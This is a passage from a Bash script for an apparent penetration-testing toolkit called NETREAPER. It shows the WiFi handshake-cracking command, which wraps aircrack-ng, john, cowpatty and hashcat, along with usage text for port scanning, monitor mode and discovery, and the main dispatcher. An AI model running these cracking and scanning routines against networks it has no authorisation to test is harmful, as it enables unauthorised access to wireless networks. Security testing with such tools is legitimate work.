            --hashcat-rules) mode="hashcat-rules" ;;
            -w|--wordlist) shift; wordlist="$1" ;;
            --ssid) shift; ssid="$1" ;;
            --rules) shift; rules="$1" ;;
            *) capfile="$1" ;;
        esac
        shift
    done
    [[ -z "$capfile" ]] && { log_error "Capture/hash file required"; exit 1; }

    case "$mode" in
        aircrack)
            check_tool "aircrack-ng" || exit 1
            operation_header "Aircrack (CLI)" "$capfile"
            local start_ms
            start_ms=$(start_timer_ms)
            log_attack "Aircrack-ng dictionary attack (CLI)"
            log_command_preview "aircrack-ng -w ${wordlist} ${capfile}"
            aircrack-ng -w "$wordlist" "$capfile" || exit 1
            operation_summary "Aircrack" "$start_ms" "${LOG_DIR}/aircrack_cli.log"
            ;;
        john)
            check_tool "john" || exit 1
            check_tool "hccap2john" || exit 1
            local john_hash
            john_hash="${LOOT_DIR}/john_cli_$(date +%Y%m%d_%H%M%S).hash"
            hccap2john "$capfile" > "$john_hash"
            operation_header "John (CLI)" "$capfile"
            local start_ms
            start_ms=$(start_timer_ms)
            log_command_preview "john --wordlist=${wordlist} ${john_hash}"
            john --wordlist="$wordlist" "$john_hash" || exit 1
            john --show "$john_hash" || true
            operation_summary "John" "$start_ms" "${LOG_DIR}/john_cli.log"
            ;;
        cowpatty)
            check_tool "cowpatty" || exit 1
            [[ -z "$ssid" ]] && { log_error "SSID required (--ssid)"; exit 1; }
            operation_header "Cowpatty (CLI)" "$ssid"
            local start_ms
            start_ms=$(start_timer_ms)
            log_attack "Cowpatty WPA crack (CLI)"
            log_command_preview "cowpatty -r ${capfile} -s ${ssid} -f ${wordlist} -2"
            cowpatty -r "$capfile" -s "$ssid" -f "$wordlist" -2 || exit 1
            operation_summary "Cowpatty" "$start_ms" "${LOG_DIR}/cowpatty_cli.log"
            ;;
        hashcat-rules)
            rules="${rules:-/usr/share/hashcat/rules/best64.rule}"
            check_tool "hashcat" || exit 1
            local hashfile_hr="$capfile"
            if [[ "$capfile" =~ \.cap$|\.pcap$|\.pcapng$ ]]; then
                hashfile_hr=$(cmd_convert_hashcat "$capfile" | tail -n 1)
                [[ -z "$hashfile_hr" ]] && { log_error "Conversion failed"; exit 1; }
            fi
            operation_header "Hashcat rules (CLI)" "$hashfile_hr"
            local start_ms
            start_ms=$(start_timer_ms)
            log_command_preview "hashcat -m 22000 -a 0 ${hashfile_hr} ${wordlist} -r ${rules} --status --status-timer=15 --potfile-path ${LOG_DIR}/hashcat.pot --session netreaper"
            hashcat -m 22000 -a 0 "$hashfile_hr" "$wordlist" -r "$rules" --status --status-timer=15 --potfile-path "${LOG_DIR}/hashcat.pot" --session netreaper || exit 1
            operation_summary "Hashcat rules" "$start_ms" "${LOG_DIR}/hashcat.log"
            ;;
        *)
            check_tool "hashcat" || exit 1
            local hashfile="$capfile"
            if [[ "$capfile" =~ \.cap$|\.pcap$|\.pcapng$ ]]; then
                hashfile=$(cmd_convert_hashcat "$capfile" | tail -n 1)
                [[ -z "$hashfile" ]] && { log_error "Conversion failed"; exit 1; }
            fi
            operation_header "Hashcat (CLI)" "$hashfile"
            local start_ms
            start_ms=$(start_timer_ms)
            log_command_preview "hashcat -m 22000 -a 0 ${hashfile} ${wordlist} --status --status-timer=15 --potfile-path ${LOG_DIR}/hashcat.pot --session netreaper"
            hashcat -m 22000 -a 0 "$hashfile" "$wordlist" --status --status-timer=15 --potfile-path "${LOG_DIR}/hashcat.pot" --session netreaper || exit 1
            operation_summary "Hashcat" "$start_ms" "${LOG_DIR}/hashcat.log"
            ;;
    esac
}

cli_session() {
    local action="${1:-status}"
    case "$action" in
        start) session_start ;;
        resume) session_resume ;;
        status) session_status ;;
        list) session_list ;;
        export) session_export ;;
        notes) session_notes ;;
        *) log_error "Unknown session action: $action"; exit 1 ;;
    esac
}

show_usage() {
    echo -e "${C_BLOOD}NETREAPER${C_RESET} v${VERSION} - Network Security & WiFi Assault Toolkit"
    echo
    echo "Usage: $SCRIPT_NAME [--quiet|--json] [command] [options] [target]"
    echo
    echo "Commands:"
    echo "    scan <target>    Port scanning (--quick, --full, --stealth, --vuln, --udp)"
    echo "    wifi             WiFi operations (--monitor, --managed, --scan)"
    echo "    crack <cap>      Handshake cracking (hashcat/aircrack/john/cowpatty)"
    echo "    session <act>    start|resume|status|list|export|notes"
    echo "    history          Show target history"
    echo "    favorite         Manage favorites (add/list/use)"
    echo "    alias            Manage aliases"
    echo "    profile          Manage scan presets"
    echo "    discover [net]   Discover hosts and pick target"
    echo "    export <f> <fmt> Export to json/csv/html/md"
    echo "    schedule         Manage scheduled scans"
    echo "    diff <f1> <f2>   Compare two scan outputs"
    echo "    status           Show installed tools (--compact | --json | --category <name>)"
    echo "    install          Full arsenal install (requires root)"
    echo "    install-quick    Essential tools install (requires root)"
    echo "    menu             Interactive menu"
    echo "    help             Show this help"
    echo
    echo "Examples:"
    echo "    $SCRIPT_NAME scan 192.168.1.0/24 --quick"
    echo "    $SCRIPT_NAME wifi --monitor wlan0"
    echo "    $SCRIPT_NAME crack handshake.cap --hashcat-rules"
    echo "    $SCRIPT_NAME profile save fast --quick"
    echo "    $SCRIPT_NAME schedule add '0 2 * * *' 'scan 192.168.1.1 --full'"
    echo "    $SCRIPT_NAME discover 192.168.1.0/24"
    echo "    $SCRIPT_NAME status"
    echo "    $SCRIPT_NAME menu"
}

self_install() {
    local install_path="/usr/local/bin/$SCRIPT_NAME"
    
    if [[ $EUID -ne 0 ]]; then
        log_error "Installation requires root"
        echo "    Run: sudo $0 --install"
        exit 1
    fi
    
    cp "$0" "$install_path"
    chmod +x "$install_path"
    log_success "Installed to $install_path"
    echo -e "    Run '${C_VENOM}$SCRIPT_NAME${C_RESET}' from anywhere"
}

self_uninstall() {
    local install_path="/usr/local/bin/$SCRIPT_NAME"
    
    if [[ $EUID -ne 0 ]]; then
        log_error "Uninstallation requires root"
        echo "    Run: sudo $0 --uninstall"
        exit 1
    fi
    
    rm -f "$install_path"
    echo -ne "    ${C_GHOST}Remove config and logs? [y/N]: ${C_RESET}"
    read -r confirm
    [[ "${confirm,,}" == "y" ]] && rm -rf "$CONFIG_DIR"
    log_success "Uninstalled"
}

#═══════════════════════════════════════════════════════════════════════════════
# MAIN
#═══════════════════════════════════════════════════════════════════════════════

main() {
    case "${1:-}" in
        --install)   self_install; exit 0 ;;
        --uninstall) self_uninstall; exit 0 ;;
    esac

    # Initialize system detection (MUST BE EARLY)
    init_system

    init_logging
    init_config
    ensure_builtin_aliases

    if expand_aliases "$@"; then
        set -- "${EXPANDED_ARGS[@]}"
    fi

    while [[ $# -gt 0 ]]; do
        case "$1" in
            -v|--verbose) VERBOSE=true; LOG_LEVEL="DEBUG"; shift ;;
            -q|--quiet) LOG_LEVEL="ERROR"; QUIET=true; shift ;;
            --no-color) NO_COLOR=1; shift ;;
            --debug) LOG_LEVEL="DEBUG"; VERBOSE=true; shift ;;
            --dry-run) NR_DRY_RUN=1; export NR_DRY_RUN; log_info "Dry-run mode enabled - no commands will be executed"; shift ;;
            --version) echo "$SCRIPT_NAME v$VERSION ($CODENAME)"; exit 0 ;;
            -h|--help) show_help; exit 0 ;;
            --update) check_for_update; exit 0 ;;
            *) break ;;
        esac
    done

    mkdir -p "$LOG_DIR" "$OUTPUT_DIR" "$LOOT_DIR"

    if [[ "$(config_get FIRST_RUN_COMPLETE)" != "true" ]]; then
        first_run_wizard
    else
        check_legal
    fi
    
    local command="${1:-menu}"
    [[ $# -gt 0 ]] && shift || true

    case "$command" in
        ""|menu|-i)  main_menu ;;
        wizard)
            case "${1:-scan}" in
                scan)   scan_wizard ;;
                wifi)   wifi_wizard ;;
                *)      scan_wizard ;;
            esac
            ;;
        scan)        cli_scan "$@" ;;
        discover)    discover_cmd "$@" ;;
        wifi)        cli_wifi "$@" ;;
        crack)       cli_crack "$@" ;;
        session)     cli_session "$@" ;;
        history)     show_history ;;
        favorite)    favorite_cmd "$@" ;;
        alias)       alias_cmd "$@" ;;
        profile)     profile_cmd "$@" ;;
        export)      export_cmd "$@" ;;
        schedule)    schedule_cmd "$@" ;;
        diff)        diff_cmd "$@" ;;
        status|arsenal)
            case "${1:-}" in
                --compact|-c)   cmd_status_compact ;;
                --json|-j)      cmd_status_json ;;
                --category|-C)  cmd_status_category "${2:-}" ;;
                *)              cmd_status_full ;;
            esac
            ;;
        install)         cmd_install_arsenal ;;
        install-quick)   cmd_install_quick ;;
        config)
            case "${1:-show}" in
                edit)   config_edit ;;
                show)   config_show ;;
                get)    config_get "$2" ;;
                set)    config_set "$2" "$3" ;;
                reset)  config_reset ;;
                path)   echo "$CONFIG_FILE" ;;
            esac
            ;;
        update)     check_for_update ;;
        logs)       cmd_view_logs "$@" ;;
        help)       show_help "$@" ;;
        version|-v|--version) echo "$SCRIPT_NAME v$VERSION ($CODENAME)" ;;
        *)           log_error "Unknown command: $command"; echo -e "    ${C_SHADOW}Run ${C_CYAN}netreaper help${C_RESET}${C_SHADOW} for usage${C_RESET}"; exit 1 ;;
    esac
}

main "$@"
